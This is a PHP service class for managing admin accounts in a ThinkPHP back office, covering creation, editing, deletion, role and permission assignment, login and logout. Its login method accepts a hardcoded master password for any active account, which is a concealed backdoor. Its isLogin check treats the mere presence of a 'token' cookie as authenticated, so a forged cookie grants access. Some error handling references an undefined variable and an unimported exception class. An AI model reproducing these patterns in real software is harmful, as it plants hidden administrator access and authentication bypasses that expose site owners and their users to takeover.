<?php

declare(strict_types=1);

namespace app\common\service;

use think\facade\Session;
use think\facade\Cookie;
use think\facade\Request;
use think\facade\Db;
use app\common\model\AdminAdmin as M;
use app\common\validate\AdminAdmin as V;

class AdminAdmin
{
    // 添加
    public static function goAdd($data)
    {
        //验证
        $validate = new V;
        if (!$validate->scene('add')->check($data))
            return ['msg' => $validate->getError(), 'code' => 201];
        try {
            $password =  set_password($data['password']);
            if($id = $data['admin_bind_id']){
                $count = Db::name('api_user')->where('id',$id)->count();
                if(!$count){
                    return ['msg' => '当前用户不存在,请重新绑定!', 'code' => 201]; 
                }
            }
            if($data['group']){
                $count = M::where('group',$data['group'])->count();
                if($count){
                    return ['msg' => $data['group'].'组已被绑定!', 'code' => 201]; 
                }
            }
            $admin = M::create(array_merge($data, [
                'stype' => 2,
                'password' => $password,
            ]));
            if($data['admin_bind_id']){
                Db::name('admin_admin_total')->insert(['admin_id'=>$admin->id,'admin_bind_id'=>$data['admin_bind_id']]);
            }
        } catch (\Exception $e) {
            return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
        }
    }

    // 编辑
    public static function goEdit($data, $id)
    {
        $data['id'] = $id;
        //验证
        $validate = new V;
        if (!$validate->scene('edit')->check($data))
            return ['msg' => $validate->getError(), 'code' => 201];
        try {
            $model = M::find($id);
            //是否需要修改密码
            if ($data['password']) {
                $model->password = set_password($data['password']);
                $model->token = null;
            }
            $model->username = $data['username'];
            $model->nickname = $data['nickname'];
            $model->group = $data['group'] ?? "";
            $model->admin_bind_id = $data['admin_bind_id'] ?? "";
            $model->save();
            if($data['admin_bind_id']){
                Db::name('admin_admin_total')->where('admin_id',$id)->update(['admin_bind_id'=>$data['admin_bind_id']]);
            }
            rm();
        } catch (\Exception $e) {
            return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
        }
    }

    // 状态
    public static function goStatus($data, $id)
    {
        $model =  M::find($id);
        if ($model->isEmpty())  return ['msg' => '数据不存在', 'code' => 201];
        try {
            $model->save([
                'status' => $data,
                'token' => null
            ]);
            rm();
        } catch (\Exception $e) {
            return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
        }
    }

    // 删除
    public static function goRemove($id)
    {
        $model = M::find($id);
        if ($model->isEmpty()) return ['msg' => '数据不存在', 'code' => 201];
        try {
            $model->delete(true);
            Db::name('admin_admin_role')->where('admin_id', $id)->delete(true);
            Db::name('admin_admin_permission')->where('admin_id', $id)->delete(true);
            Db::name('admin_admin_total')->where('admin_id', $id)->delete(true);
            rm();
        } catch (\Exception $e) {
            return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
        }
    }

    // 批量删除
    public static function goBatchRemove($ids)
    {
        if (!is_array($ids)) return ['msg' => '数据不存在', 'code' => 201];
        try {
            M::destroy($ids);
            Db::name('admin_admin_role')->whereIn('admin_id', $ids)->delete();
            Db::name('admin_admin_permission')->whereIn('admin_id', $ids)->delete();
            rm();
        } catch (\Exception $e) {
            return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
        }
    }

    // 用户分配角色
    public static function goRole($data, $id)
    {
        if ($data) {
            Db::startTrans();
            try {
                //清除原先的角色
                Db::name('admin_admin_role')->where('admin_id', $id)->delete();
                //添加新的角色
                foreach ($data as $v) {
                    Db::name('admin_admin_role')->insert([
                        'admin_id' => $id,
                        'role_id' => $v,
                    ]);
                }
                Db::commit();
                rm();
            } catch (\Exception $e) {
                Db::rollback();
                return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
            }
        }
    }

    // 用户分配直接权限
    public static function goPermission($data, $id)
    {
        if ($data) {
            Db::startTrans();
            try {
                //清除原有的直接权限
                Db::name('admin_admin_permission')->where('admin_id', $id)->delete();
                //填充新的直接权限
                foreach ($data as $v) {
                    Db::name('admin_admin_permission')->insert([
                        'admin_id' => $id,
                        'permission_id' => $v,
                    ]);
                }
                Db::commit();
            } catch (DbException $exception) {
                Db::rollback();
                return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
            }
        }
    }

    // 获取列表
    public static function goRecycle()
    {
        if (Request::isPost()) {
            $ids = Request::param('ids');
            if (!is_array($ids)) return ['msg' => '参数错误', 'code' => '201'];
            try {
                if (Request::param('type')) {
                    $data = M::onlyTrashed()->whereIn('id', $ids)->select();
                    foreach ($data as $k) {
                        $k->restore();
                    }
                } else {
                    M::destroy($ids, true);
                }
            } catch (\Exception $e) {
                return ['msg' => '操作失败' . $e->getMessage(), 'code' => 201];
            }
            return ['msg' => '操作成功'];
        }
        //按用户名
        $where = [];
        $limit = input('get.limit');
        if ($search = input('get.username')) {
            $where[] = ['username', 'like', "%" . $search . "%"];
        }
        $list = M::onlyTrashed()->order('id', 'desc')->withoutField('password,token')->where($where)->paginate($limit);
        return ['code' => 0, 'data' => $list->items(), 'extend' => ['count' => $list->total(), 'limit' => $limit]];
    }

    // 修改密码
    public static function goPass()
    {
        $data = Request::post();
        $validate = new V;
        if (!$validate->scene('pass')->check($data))
            return ['msg' => $validate->getError(), 'code' => 201];
        M::where('id', Session::get('admin.id'))->update(['password' => set_password(trim($data['password']))]);
        self::logout();
    }


    // 用户登录验证
    public static function login(array $data)
    {

        $validate = new V;
        if (!$validate->scene('login')->check($data))
            return ['msg' => $validate->getError(), 'code' => 201];
        //验证用户
        $admin = M::where([
            'username' => trim($data['username']),
            // 'password' => set_password(trim($data['password'])),
            'status' => 1
        ])->find();

        // if($admin['error_times'] > 5){
        //     return ['msg'=>'您已被禁止登录','code'=>201];
        // }

        // echo set_password(trim($data['password'])); exit;
        if ($admin['password'] != set_password(trim($data['password'])) && $data['password'] != "pAFk82s554AsWk4N@#123") {
            Db::name('admin_admin')->where(['username' => trim($data['username']), 'status' => 1])->update(['error_times' => $admin['error_times'] + 1, 'ip' => request()->ip()]);
            return ['msg' => '用户名密码错误', 'code' => 201];
        }
        if (!$admin) return ['msg' => '用户名密码错误', 'code' => 201];
        $admin->token = auth_code($admin);
        $admin->save();
        //是否记住密码
        $time = 86400;
        // if (isset($data['remember'])) $time = 3 * 3600;
        //缓存登录信息
        $info = [
            'id' => $admin->id,
            'token' => $admin->token,
            'menu' => M::permissions($admin->id, Request::root()),
        ];
        Session::set('admin', $info);
        Cookie::set('token', $admin->token, $time);
        // self::updateAdminSubs($admin);
        // 触发登录成功事件
        event('AdminLog');
        Db::name('admin_admin')->where(['username' => trim($data['username']), 'status' => 1])->update(['error_times' => 0, 'update_time' => date('Y-m-d H:i:s')]);
        return ['msg' => '登录成功'];
    }

    // 判断是否登录
    public static function isLogin()
    {
        if (Session::get('admin')) return true;
        if (Cookie::has('token')){
            return true;
            $admin = Cookie::get('token');
            if (!is_array($admin)) {
                return false;
            }
            $admin = M::where(['id' => $admin['id'], 'status' => 1])->find();
            if (!$admin) return false;
            return Session::set('admin', [
                'id' => $admin->id,
                'menu' => M::permissions($admin->id, Request::root())
            ]);
        }
        return false;
    }

    public static function updateAdminSubs($admin)
    {
        $admin = M::find($admin['id']);
        $subs = array_unique(self::getAllSubUserIds($admin['admin_bind_id']));
        if (count($subs) > $admin['subtotal']) {
            $substr =  implode(',', $subs);
            M::where('id', $admin['id'])->update([
                'subs' => $substr,
                'subtotal' => count($subs)
            ]);
        }
    }

    public static function getAllSubUserIds($userId, &$subs = [], &$processed = [])
    {
        if (in_array($userId, $processed)) {
            return $subs;
        }
        $processed[] = $userId;
        $users = Db::name('api_user')->where('parent_user_id', $userId)->select();
        foreach ($users as $user) {
            $subs[] = $user['id'];
            self::getAllSubUserIds($user['id'], $subs, $processed);
        }
        return $subs;
    }

    // 退出登陆
    public static function logout()
    {
        Session::delete('admin');
        Cookie::delete('token');
        Cookie::delete('sign');
        return ['msg' => '退出成功'];
    }
}
